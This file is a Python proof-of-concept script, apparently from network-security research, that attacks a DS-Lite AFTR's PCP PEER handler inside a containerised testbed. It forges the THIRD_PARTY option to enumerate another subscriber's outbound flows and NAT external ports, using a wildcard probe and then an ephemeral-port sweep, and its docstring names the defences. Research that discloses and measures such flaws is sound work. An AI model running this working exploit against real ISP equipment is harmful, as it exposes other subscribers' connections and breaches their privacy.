#!/usr/bin/env python3
"""T10: Cross-Subscriber PCP PEER Enumeration via THIRD_PARTY.

NOVEL attack discovered in this work. Demonstrates that the AFTR's
PCP PEER handler accepts an attacker-supplied THIRD_PARTY option
containing an arbitrary internal IPv4 address, then queries the
shared conntrack table with that address. Without RFC 7652 PCP
authentication, this lets a B4-1 attacker enumerate outbound flows
of any other subscriber (B4-2, B4-3, ...) sharing the AFTR.

Threat model:
  Attacker: P1 or P2 vantage (LAN behind one B4 or ISP segment)
  Target:   another subscriber on a different B4 sharing the AFTR
  Impact:   Observation-isolation breach: attacker learns which
            destinations victim is connected to and the AFTR-assigned
            external port for each flow.

Defense:
  Primary:   RFC 7652 PCP authentication (HMAC on every PEER request)
  Secondary: Bind THIRD_PARTY int_ip to the requester's softwire — reject
             requests where int_ip does not belong to client_addr6's B4.

Run inside the testbed container:
  docker exec dslite python3 /testbed/attack_tools/infra/t10_peer_crosssub.py
"""
import argparse, os, socket, struct, subprocess, sys, time
import re

sys.path.insert(0, "/testbed/attack_tools")


PCP_PORT_AFTR = 5351
PCP_VERSION   = 2
OP_PEER       = 2
OPT_THIRD_PARTY = 1

VICTIM_NETNS  = "client2"
VICTIM_IP     = "10.0.2.100"
ATTACKER_NETNS = "b4-1"
AFTR_IP6      = "2001:db8:cafe::10"
SERVER_IP     = "198.51.100.2"

RESULT_NAMES = {
    0: "SUCCESS", 1: "UNSUPP_VERSION", 2: "NOT_AUTHORIZED",
    3: "MALFORMED_REQUEST", 4: "UNSUPP_OPCODE", 5: "UNSUPP_OPTION",
    6: "MALFORMED_OPTION", 7: "NETWORK_FAILURE", 8: "NO_RESOURCES",
    9: "UNSUPP_PROTOCOL", 10: "USER_EX_QUOTA",
    11: "CANNOT_PROVIDE_EXTERNAL", 12: "ADDRESS_MISMATCH",
    13: "EXCESSIVE_REMOTE_PEERS",
}


def v4mapped(ipv4_str: str) -> bytes:
    return b"\x00" * 10 + b"\xff\xff" + socket.inet_aton(ipv4_str)


def build_peer_request(int_ip_v4: str, int_port: int,
                       remote_ip_v4: str, remote_port: int,
                       proto: int = 6, lifetime: int = 60) -> bytes:
    nonce = os.urandom(12)
    hdr = struct.pack("!BBBxI", PCP_VERSION, OP_PEER, 0, lifetime)
    hdr += socket.inet_pton(socket.AF_INET6, "::")
    pld = nonce
    pld += struct.pack("!B", proto) + b"\x00" * 3
    pld += struct.pack("!H", int_port)
    pld += struct.pack("!H", 0) + v4mapped("0.0.0.0")
    pld += struct.pack("!H", remote_port) + b"\x00" * 2
    pld += v4mapped(remote_ip_v4)
    opt = struct.pack("!BBH", OPT_THIRD_PARTY, 0, 16) + v4mapped(int_ip_v4)
    return hdr + pld + opt


def parse_peer_response(data: bytes) -> dict:
    if len(data) < 24:
        return {"error": "short"}
    result_code = data[3]
    lifetime = struct.unpack("!I", data[4:8])[0]
    pld = data[24:]
    if len(pld) < 56:
        return {"result": result_code,
                "result_name": RESULT_NAMES.get(result_code, "?")}
    int_port = struct.unpack("!H", pld[16:18])[0]
    ext_port = struct.unpack("!H", pld[18:20])[0]
    ext_ip = ".".join(str(b) for b in pld[20:36][-4:])
    remote_port = struct.unpack("!H", pld[36:38])[0]
    remote_ip = ".".join(str(b) for b in pld[40:56][-4:])
    return {"result": result_code,
            "result_name": RESULT_NAMES.get(result_code, "?"),
            "lifetime": lifetime,
            "int_port": int_port, "ext_port": ext_port,
            "ext_ip": ext_ip,
            "remote_port": remote_port, "remote_ip": remote_ip}


def send_pcp(pkt: bytes, src_netns: str, timeout: float = 1.0):
    pkt_hex = pkt.hex()
    script = (
        "import socket\n"
        f"s = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)\n"
        f"s.settimeout({timeout})\n"
        f"s.sendto(bytes.fromhex('{pkt_hex}'), "
        f"('{AFTR_IP6}', {PCP_PORT_AFTR}))\n"
        "try: print(s.recvfrom(4096)[0].hex())\n"
        "except socket.timeout: print('TIMEOUT')\n"
    )
    out = subprocess.run(
        ["ip", "netns", "exec", src_netns, "python3", "-c", script],
        capture_output=True, text=True, timeout=timeout + 3)
    line = out.stdout.strip()
    if line == "TIMEOUT" or not line:
        return None
    try:
        return bytes.fromhex(line)
    except Exception:
        return None


def start_victim_flow(remote_port: int = 6666) -> subprocess.Popen:
    # Connect to the socat sleep-300 holder on port 6666 with --recv-only
    # so ncat does not close the write side on stdin EOF. The server fork
    # holds each connection open for 5 minutes (sleep 300), guaranteeing
    # ESTABLISHED state in AFTR conntrack for the full trial window.
    # Port 80 (single-threaded Python HTTP) was replaced because it blocked
    # on the first accepted connection and prevented subsequent accept() calls.
    return subprocess.Popen(
        ["ip", "netns", "exec", VICTIM_NETNS, "ncat",
         "--recv-only", SERVER_IP, str(remote_port)],
        stdin=subprocess.DEVNULL,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL)


def aftr_victim_flows() -> dict:
    """Ground truth: which (int_sport → ext_port) does AFTR conntrack
    have for victim 10.0.2.100? Attacker does NOT have this — it is
    only used to verify the attack's recall/precision after the fact.
    """
    try:
        out = subprocess.run(
            ["ip", "netns", "exec", "aftr", "sh", "-c",
             f"conntrack -L -s {VICTIM_IP} -p tcp 2>/dev/null "
             "| grep ESTABLISHED"],
            capture_output=True, text=True, timeout=3).stdout
    except Exception:
        return {}
    flows = {}
    for line in out.splitlines():
        sports = re.findall(r"sport=(\d+)", line)
        dports = re.findall(r"dport=(\d+)", line)
        if len(sports) >= 1 and len(dports) >= 2:
            flows[int(sports[0])] = (int(dports[0]), int(dports[1]))
    return flows


def run_t10(n_victim_flows: int = 3, brute_window: int = 100,
            verbose: bool = True) -> dict:
    """Run one trial of T10.

    Returns a dict with measurement results that AttackResult can
    consume.
    """
    # Per-trial pre-clean. The harness reset_aftr_state() runs between
    # attacks, but within an attack the per-trial UDP conntracks left by
    # the brute-force PCP-PEER probes (100/trial) and the long-lived
    # victim ncat conntracks accumulate. We flush twice with a gap to
    # let the UDP timeouts release first, and kill any leftover ncat
    # processes on the victim B4 aggressively.
    subprocess.run(["ip", "netns", "exec", VICTIM_NETNS, "sh", "-c",
                    "pkill -9 -f 'ncat' 2>/dev/null; true"],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(["ip", "netns", "exec", "aftr", "conntrack", "-F"],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(2)
    subprocess.run(["ip", "netns", "exec", "aftr", "conntrack", "-F"],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(1)

    if verbose:
        print(f"[T10] spawning {n_victim_flows} persistent victim flows ...")
    victims = [start_victim_flow(6666) for _ in range(n_victim_flows)]
    # Wait window for the 3-way handshake to complete and the AFTR's
    # softwire-side conntrack to register every victim flow. Under the
    # corpus load (tcpdump on every interface, accumulated pcap I/O),
    # the slow path can take up to ~10s. We poll for up to 15s.
    time.sleep(3)
    truth_check_attempts = 0
    while truth_check_attempts < 12 and not aftr_victim_flows():
        time.sleep(1)
        truth_check_attempts += 1

    truth = aftr_victim_flows()
    truth_sports = sorted(truth.keys())
    truth_ext = {extp for (_dport, extp) in truth.values()}
    if verbose:
        print(f"[T10] ground truth victim sports: {truth_sports}")

    if not truth:
        for v in victims:
            try: v.terminate()
            except Exception: pass
        return {"success": False, "leaks": 0, "true_positives": 0,
                "false_positives": 0, "false_negatives": 0,
                "probes": 0, "duration_s": 0, "leaked_ext_ports": [],
                "wildcard_leak": None}

    t0 = time.time()
    probes = 0
    leaked_ext = set()   # external (NAT) ports disclosed about the victim

    # ---- Phase 1: ZERO-KNOWLEDGE wildcard leak ---------------------------
    # int_port=0 is a PCP PEER wildcard: the AFTR consults the shared
    # conntrack table for ANY of the THIRD_PARTY-claimed victim's flows and
    # returns the NAT-assigned external port of the first match. The
    # attacker needs NO knowledge of the victim's ephemeral source port.
    wildcard_leak = None
    pkt = build_peer_request(int_ip_v4=VICTIM_IP, int_port=0,
                             remote_ip_v4=SERVER_IP, remote_port=6666)
    resp = send_pcp(pkt, src_netns=ATTACKER_NETNS, timeout=0.5)
    probes += 1
    if resp:
        r = parse_peer_response(resp)
        if r.get("ext_port", 0) > 0:
            wildcard_leak = r["ext_port"]
            leaked_ext.add(r["ext_port"])

    # ---- Phase 2: bounded enumeration over the ATTACKER-KNOWABLE range ---
    # To enumerate the *full* victim flow set the attacker must probe per
    # source port. The only attacker-side knowledge is that Linux clients
    # draw ephemeral ports from net.ipv4.ip_local_port_range (default
    # 32768-60999). The sweep below scans a bounded slice of THAT range and
    # honestly reports recall + probe count; it is NOT seeded from the
    # victim's actual ports. Full enumeration cost scales with the whole
    # ~28k-port ephemeral range (see paper for the cost discussion).
    EPHEMERAL_LO = 32768
    lo = EPHEMERAL_LO
    hi = min(65535, EPHEMERAL_LO + brute_window)
    for sport in range(lo, hi + 1):
        pkt = build_peer_request(int_ip_v4=VICTIM_IP, int_port=sport,
                                 remote_ip_v4=SERVER_IP, remote_port=6666)
        resp = send_pcp(pkt, src_netns=ATTACKER_NETNS, timeout=0.3)
        probes += 1
        if resp:
            r = parse_peer_response(resp)
            if r.get("ext_port", 0) > 0:
                leaked_ext.add(r["ext_port"])
    dt = time.time() - t0

    # Score against ground-truth EXTERNAL ports (a NAT binding the attacker
    # has no right to observe). The wildcard alone usually confirms the leak.
    tp = len(leaked_ext & truth_ext)
    fp = len(leaked_ext - truth_ext)
    fn = len(truth_ext - leaked_ext)

    for v in victims:
        try: v.terminate(); v.wait(timeout=2)
        except Exception: pass

    if verbose:
        print(f"[T10] probes={probes} elapsed={dt:.2f}s wildcard_leak="
              f"{wildcard_leak} TP={tp} FP={fp} FN={fn}")

    return {"success": tp > 0 and fp == 0,
            "leaks": len(leaked_ext), "true_positives": tp,
            "false_positives": fp, "false_negatives": fn,
            "probes": probes, "duration_s": round(dt, 2),
            "ground_truth_flows": n_victim_flows,
            "wildcard_leak": wildcard_leak,
            "leaked_ext_ports": sorted(leaked_ext)}


def main():
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("--trials", type=int, default=3)
    ap.add_argument("--flows", type=int, default=3,
                    help="victim flow count per trial")
    args = ap.parse_args()

    if os.geteuid() != 0:
        print("must run as root", file=sys.stderr); sys.exit(1)

    print("=" * 64)
    print("T10 — Cross-Subscriber PCP PEER Enumeration via THIRD_PARTY")
    print("=" * 64)
    print(f"Attacker netns: {ATTACKER_NETNS}, victim netns: {VICTIM_NETNS}")
    print(f"AFTR IPv6:      {AFTR_IP6}:{PCP_PORT_AFTR}")
    print(f"Victim IPv4:    {VICTIM_IP}  (claimed via THIRD_PARTY)")
    print()

    all_tp = all_fp = all_fn = all_probes = 0
    successes = wildcard_hits = 0
    leaked_ext_all: set = set()
    for trial in range(args.trials):
        print(f"--- trial {trial + 1}/{args.trials} ---")
        r = run_t10(n_victim_flows=args.flows, brute_window=100,
                    verbose=True)
        if r["success"]:
            successes += 1
        if r.get("wildcard_leak"):
            wildcard_hits += 1
        all_tp += r["true_positives"]
        all_fp += r["false_positives"]
        all_fn += r["false_negatives"]
        all_probes += r["probes"]
        leaked_ext_all.update(r.get("leaked_ext_ports", []))

    overall = successes == args.trials
    print()
    print("===== T10 verdict =====")
    print(f"trials passed: {successes}/{args.trials}")
    print(f"aggregate TP={all_tp} FP={all_fp} FN={all_fn}, "
          f"precision={all_tp/max(1,all_tp+all_fp):.2%}, "
          f"recall={all_tp/max(1,all_tp+all_fn):.2%}")
    if overall:
        print("*** T10 SUCCESS: cross-subscriber observation-isolation broken ***")
    else:
        print("T10 not fully reproduced — check victim flow setup or defenses")


if __name__ == "__main__":
    main()
